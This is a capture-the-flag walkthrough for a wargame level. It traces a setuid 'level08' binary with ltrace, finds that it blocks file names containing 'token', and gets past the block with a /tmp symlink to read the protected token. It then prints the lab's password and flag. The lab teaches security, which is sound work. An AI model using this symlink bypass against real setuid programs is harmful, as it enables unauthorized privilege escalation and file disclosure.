- List the files in level08 user home directory to find 'level08' executable and 'token' file owned by flag08 user (setuid control bit active on the executable).

- Run the executable with differents arguments using ltrace to understand its behaviour (look at the assembly code with 'gdb' may be useful too).

`ltrace ./level08`
__libc_start_main(0x8048554, 1, 0xbffff7e4, 0x80486b0, 0x8048720 <unfinished ...>
printf("%s [file to read]\n", "./level08"./level08 [file to read]
)                      = 25
exit(1 <unfinished ...>
+++ exited (status 1) +++

`ltrace ./level08 token`
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                        = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                    = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++

`ltrace ./level08 .bash_logout` # .bash_logout file is used as an example here
__libc_start_main(0x8048554, 2, 0xbffff7c4, 0x80486b0, 0x8048720 <unfinished ...>
strstr(".bash_logout", "token")                                 = NULL
open(".bash_logout", 0, 014435162522)                           = 3
read(3, "# ~/.bash_logout: executed by ba"..., 1024)            = 220
write(1, "# ~/.bash_logout: executed by ba"..., 220# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
)            = 220
+++ exited (status 220) +++

- We understand that the executable opens the file passed as argument, then reads its content and prints it to the standard output.

- Note that before these instructions, the program checks if the argument contains the string "token" by calling 'strstr([argument], "token")'. If so, it exits immediately after printing the message 'You may not access [argument]'

- So we need to bypass this checking to make the program open the token file, what we do by creating a symbolic link which points to the 'token' file.

`ln -s ~/token /tmp/t0ken`
`./level08 /tmp/t0ken`
quif5eloekouj29ke0vouxean

`su flag08`
`quif5eloekouj29ke0vouxean`
`getflag`
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
